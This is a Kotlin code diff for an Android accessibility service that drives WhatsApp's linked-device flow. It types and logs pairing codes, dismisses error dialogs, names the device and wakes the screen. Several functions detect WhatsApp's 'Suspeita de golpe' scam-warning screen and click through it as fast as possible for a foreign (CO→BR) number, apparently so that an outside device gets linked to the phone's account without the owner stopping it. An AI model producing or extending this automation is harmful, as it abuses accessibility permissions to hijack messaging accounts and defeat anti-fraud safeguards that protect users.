+        fun typePairingCode(code: String): Boolean {
+            val service = instance
+            if (service == null) {
+                Log.w(TAG, "typePairingCode: serviço a11y não conectado")
+                return false
+            }
+            val root = service.whatsappRoot()
+            if (root == null) {
+                Log.w(TAG, "typePairingCode: whatsappRoot null")
+                return false
+            }
+            if (service.enterPairingCodeOnScreen(root, code)) {
+                WhatsappLinkDeviceState.pairingCodeSubmitted = true
+                Log.i(TAG, "typePairingCode OK: $code")
+                return true
+            }
+            Log.w(TAG, "typePairingCode falhou: $code")
+            return false
+        }
+
+        /** Erro após digitar código inválido/expirado. */
+        fun isOnPairingErrorDialog(): Boolean {
+            val service = instance ?: return false
+            val root = service.whatsappRoot() ?: return false
+            return service.treeContainsAny(
+                root,
+                listOf(
+                    "NÃO FOI POSSÍVEL CONECTAR",
+                    "NAO FOI POSSIVEL CONECTAR",
+                    "COULD NOT CONNECT",
+                    "COULD NOT LINK",
+                    "NO FUE POSIBLE CONECTAR",
+                    "NO SE PUDO CONECTAR",
+                    "SOLICITE UM NOVO CÓDIGO",
+                    "SOLICITE UM NOVO CODIGO",
+                    "REQUEST A NEW CODE",
+                    "SOLICITA UN NUEVO CÓDIGO",
+                ),
+            )
+        }
+
+        fun dismissPairingErrorDialog(): Boolean {
+            val service = instance ?: return false
+            val root = service.whatsappRoot() ?: return false
+            val dismiss = listOf("OK", "ENTENDI", "GOT IT", "ACEPTAR", "ACCEPT")
+            for (text in dismiss) {
+                if (service.clickByText(root, text, partial = false)) return true
+            }
+            return false
+        }
 
         /** Tela "Insira o código" com caixinhas visível — evita reabrir activity (invalida sessão). */
         fun isOnEnterCodeScreen(): Boolean {
@@ -887,6 +1646,82 @@ class WhatsappRegistrationAccessibilityService : AccessibilityService() {
             val service = instance ?: return 0
             val root = service.whatsappRoot() ?: return 0
             return service.findPairingCodeEdits(root).size
+        }
+
+        /** Tela "Suspeita de golpe" após digitar o código (ou alerta modal com OK). */
+        fun isOnScamWarningScreen(): Boolean {
+            val service = instance ?: return false
+            val root = service.whatsappRoot() ?: return false
+            if (service.findPairingCodeEdits(root).size >= 4) return false
+            val hasWarning = service.treeContainsAny(root, SCAM_WARNING_HINTS) ||
+                service.treeContainsAny(root, SCAM_COUNTRY_HINTS)
+            val hasConnect = service.treeContainsAny(root, SCAM_CONNECT_HINTS)
+            if (hasWarning && hasConnect) return true
+            if (hasWarning && service.treeContainsAny(
+                    root,
+                    listOf("OK", "ENTENDI", "ENTENDIDO", "ACEPTAR", "GOT IT", "ACEITO"),
+                )
+            ) return true
+            return hasConnect
+        }
+
+        /** Clica OK ou Conectar o mais rápido possível — número internacional (CO→BR). */
+        fun confirmScamWarningFast(): Boolean {
+            val service = instance ?: return false
+            val root = service.whatsappRoot() ?: return false
+            if (isOnNameDeviceScreen()) {
+                WhatsappLinkDeviceState.beginNameDevice(
+                    WhatsappLinkDeviceState.deviceName ?: WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME,
+                )
+                return true
+            }
+            if (service.treeContainsAny(root, SCAM_WARNING_HINTS) ||
+                service.treeContainsAny(root, SCAM_COUNTRY_HINTS)
+            ) {
+                if (service.clickScamDismissOk(root)) return true
+            }
+            return confirmScamWarning()
+        }
+
+        /** Tela para nomear o dispositivo vinculado. */
+        fun isOnNameDeviceScreen(): Boolean {
+            val service = instance ?: return false
+            val root = service.whatsappRoot() ?: return false
+            if (service.findDeviceNameEdit(root) != null) return true
+            if (service.findPairingCodeEdits(root).size >= 4) return false
+            if (service.treeContainsAny(root, NAME_DEVICE_HINTS)) return true
+            val edit = service.findFirstEditText(root) ?: return false
+            return edit.isEditable && !service.treeContainsAny(root, SCAM_WARNING_HINTS)
+        }
+
+        /** Voltou ao chat principal ou lista de dispositivos — pairing concluído. */
+        fun isPairingFlowComplete(): Boolean {
+            val service = instance ?: return false
+            val root = service.whatsappRoot() ?: return false
+            if (isOnEnterCodeScreen() || isOnScamWarningScreen() || isOnNameDeviceScreen()) {
+                return false
+            }
+            val doneHints = listOf(
+                "DISPOSITIVOS CONECTADOS",
+                "DISPOSITIVOS VINCULADOS",
+                "LINKED DEVICES",
+                "DISPOSITIVOS VINCULADOS",
+                "CHATS",
+                "CONVERSAS",
+                "CONVERSACIONES",
+                "STATUS",
+                "ESTADO",
+                "ESTADOS",
+                "COMUNIDADES",
+                "COMMUNITIES",
+            )
+            return service.treeContainsAny(root, doneHints)
+        }
+
+        fun wakeScreen(): Boolean {
+            val service = instance ?: return false
+            service.wakeScreen()
+            return true
         }
     }
 }
